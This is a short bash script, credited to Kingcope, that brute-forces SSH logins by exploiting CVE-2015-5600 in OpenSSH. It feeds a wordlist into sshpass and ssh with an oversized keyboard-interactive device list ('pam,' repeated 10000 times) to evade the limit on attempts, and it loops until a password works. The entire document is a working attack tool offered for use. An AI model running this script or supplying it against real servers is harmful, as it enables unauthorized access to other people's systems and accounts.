#!/bin/bash
# Credit to Kingcope
# Brute forcer for CVE-2015-5600

USAGE="USAGE: cat wordlist.txt | $0 <ssh-username> <ssh-target>"

if [[ "$1" == $NULL ]]; then
	echo $USAGE
	exit 1
elif [[ "$2" == $NULL ]]; then
	echo $USAGE
	exit 2
else
	echo "Starting..."
fi

while true
do
read password
sshpass -p "$password" ssh -l$1 -oKbdInteractiveDevices=`perl -e 'print "pam," x10000'` $2
rc=$?; if [[ $rc == 0 ]]; then exit $rc; fi
echo "Respawn due to login grace time..."
done
